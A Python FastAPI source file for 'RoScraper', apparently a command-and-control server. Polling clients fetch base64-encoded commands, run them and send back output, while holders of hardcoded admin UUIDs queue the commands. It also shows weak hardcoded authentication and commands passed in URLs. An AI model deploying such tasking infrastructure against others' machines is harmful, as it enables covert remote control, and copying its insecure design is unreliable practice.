from fastapi import FastAPI, Response, Request
import logging
import base64

tags_metadata = [
    {
        'name': 'Root',
        'description': 'Root endpoint returning version info'
    },

    {
        'name': 'Ping',
        'description': 'Basic endpoint for ensuring there\'s a stable connection between the server and client'
    },

    {
        'name': 'Commands',
        'description': 'Endpoint automatically used by the client to retrieve the command for execution'
    },

    {
        'name': 'Command Response',
        'description': 'Endpoint automatically used by client to log the output of the most recent command executed'
    },

    {
        'name': 'Queue Commands',
        'description': 'Endpoint used for queueing commands to the RoScraper Node Client'
    },

    {
        'name': 'View Command Output',
        'Description': 'Endpoint used for retrieving the output of the last command'
    },

    {
        'name': 'Clear Command Queue',
        'description': 'Endpoint used for clearing the command queue'
    }
]

app = FastAPI(
    title='RoScraper',
    version='0.1',
    description='A simple API used for interfacing with the RoScraper Node Client',
    openapi_tags=tags_metadata
)

# Configure Logging
logging.basicConfig(filename="logs.log",
                    format='%(asctime)s %(message)s',
                    filemode='w')

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)

# Define valid UUIDs
valid_uuids = ['test-system',
               'ligma',
               'tctcl',
               'insomnia']

admin_uuids = ['cockandballs',
               'insomnia_admin']

# Commands are executed in reverse order - fix this.
command_list = ['one',
                'two',
                'three',
                'four']

response_list = ['']

# Paths to exclude from UUID validation
uuid_exempt_paths = ['docs',
                     'openapi.json']


# Root endpoint returning version info
@app.get('/<{uuid}>', tags=['Root'])
def root(uuid: str):
    return Response('RoScraper v0.1')


# Basic endpoint for ensuring there's a stable connection between the server and client
@app.get('/ping/<{uuid}>', tags=['Ping'])
def ping(uuid: str):
    return Response('Success')


# command() and command_response() introduce the possibility for race-condition related UB, idc

# Endpoint automatically used by the client to retrieve the command for execution
@app.get('/commands/<{uuid}>', tags=['Commands'])
def command(uuid: str):
    if len(command_list) > 0:
        return Response(encode(command_list[len(command_list) - 1]))
    else:
        return Response('')


# Endpoint automatically used by client to log the output of the most recent command executed
@app.get('/command_response/<{uuid}>{response}', tags=['Command Response'])
def command_response(response: str):
    if len(command_list) > 0:
        command_list.remove(command_list[len(command_list) - 1])
        response = decode(response)
        response_list.insert(0, response)
        print(response_list[0])
    return Response('')


# -------------------------------------------------------------------- #
#                   Admin endpoints start here                         #
# (these are scary, don't allow access to these without an admin UUID) #
# -------------------------------------------------------------------- #


# Endpoint used for queueing commands to the RoScraper Node client
@app.get('/admin/queue_command/<{admin_uuid}>{requested_command}', tags=['Queue Commands'])
def admin_queue_command(admin_uuid: str, requested_command: str):
    if admin_uuid in admin_uuids:
        requested_command = encode(requested_command)
        command_list.insert(0, requested_command)
        return Response('')
    else:
        return Response('Admin UUID Required')


# Endpoint used for retrieving the output of the last command
@app.get('/admin/view_command_output/<{admin_uuid}>', tags=['View Command Output'])
def admin_view_command_output(admin_uuid: str):
    if admin_uuid in admin_uuids:
        command_output = encode(response_list[0])
        return Response(command_output)
    else:
        return Response('Admin UUID Required')


# Endpoint used for clearing the command queue
@app.get('/admin/clear_command_queue/<{admin_uuid}>', tags=['Clear Command Queue'])
def clear_command_queue(admin_uuid: str):
    if admin_uuid in admin_uuids:
        command_list.clear()
        return Response('')
    else:
        return Response('Admin UUID Required')


# Logging and UUID validation middleware
@app.middleware("http")
async def log_request(request: Request, call_next):
    ip = str(request.client.host)
    full_path = str(request.url).replace(str(request.base_url), '')
    start = full_path.find('<')
    end = full_path.find('>')
    uuid = full_path[start + 1:end]
    path = full_path[0:start]

    logger.info(f'{ip}, {uuid}, {path}')

    # Bypass UUID check for built-in documentation pages
    if full_path in uuid_exempt_paths:
        response = await call_next(request)
        return response

    # UUID check
    if uuid in valid_uuids or uuid in admin_uuids:
        response = await call_next(request)
        return response
    else:
        return Response('UUID invalid', status_code=401)


# Internal functions start here


# Functions for encoding and decoding data - used because I don't feel like parsing strings that contain spaces
def decode(string):
    try:
        string = string.encode('ascii')
        string = base64.b64decode(string)
        string = string.decode('ascii')
        return string

    except UnicodeDecodeError:
        return ''


def encode(string):
    try:
        string = string.encode('ascii')
        string = base64.b64encode(string)
        string = string.decode('ascii')
        return string

    except UnicodeDecodeError:
        return ''
